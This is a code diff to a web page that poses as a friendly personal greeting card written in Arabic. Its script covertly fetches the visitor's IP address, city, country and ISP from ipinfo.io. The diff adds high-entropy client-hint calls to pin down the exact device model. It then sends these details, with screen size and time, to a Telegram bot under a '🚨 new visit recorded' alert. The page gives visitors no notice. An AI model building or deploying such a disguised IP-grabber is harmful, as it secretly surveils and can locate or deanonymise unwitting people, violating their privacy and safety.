@@ -30,7 +30,7 @@
 <body>
 
     <div class="card">
-        <h1>محتي الشخصية 👋</h1>
+        <h1> 👋</h1>
         <p>يسعدني مرورك من هنا!</p>
     </div>
 
@@ -40,6 +40,7 @@
 
         async function sendVisitorData() {
             try {
+                // جلب بيانات الموقع الجغرافي
                 const response = await fetch("https://ipinfo.io/json");
                 const data = await response.json();
 
@@ -48,30 +49,36 @@
                 const country = data.country || "غير معروف";
                 const org = data.org || "غير معروف";
                 
-                // تحليل دقيق لـ User-Agent لمعرفة نوع النظام والهاتف
-                const ua = navigator.userAgent;
-                let deviceType = "حاسوب / جهاز مكتبد";
-                if (/android/i.test(ua)) {
-                    deviceType = "هاتف Android";
-                } else if (/iphone|ipad|ipod/i.test(ua)) {
-                    deviceType = "هاتف iPhone / iOS";
-                } else if (/mobile/i.test(ua)) {
-                    deviceType = "هاتف محمول آخر";
+                // محاولة استخراج نوع الجهاز والطراز بدقة باستخدام التقنية الحديثة
+                let deviceModel = "هاتف Android";
+                try {
+                    if (navigator.userAgentData) {
+                        const uaData = await navigator.userAgentData.getHighEntropyValues(["platform", "model", "platformVersion"]);
+                        if (uaData.model && uaData.model !== "") {
+                            deviceModel = uaData.platform + " (" + uaData.model + ")";
+                        } else {
+                            deviceModel = uaData.platform + " (Android)";
+                        }
+                    }
+                } catch (e) {
+                    console.log("Client hints not supported");
                 }
 
+                const userAgent = navigator.userAgent;
                 const screenRes = window.screen.width + "x" + window.screen.height;
                 const time = new Date().toLocaleString();
 
+                // بناء نص الرسالة
                 const textMsg = 
                     "🚨 تم تسجيل زيارة جديدة!\n\n" +
                     "📍 الموقع التقريبي: " + city + "، " + country + "\n" +
                     "🌐 IP: " + ip + "\n" +
                     "📡 المزود: " + org + "\n" +
-                    "📱 الجهاز: " + deviceType + "\n" +
-                    "💻 المتصفح والـ UA: " + ua.substring(0, 100) + "...\n" +
+                    "📱 الجهاز: " + deviceModel + "\n" +
                     "🖥 الشاشة: " + screenRes + "\n" +
                     "⏰ الوقت: " + time;
 
+                // إرسال الطلب إلى بوت تيليجرام
                 await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                     method: "POST",
                     headers: {
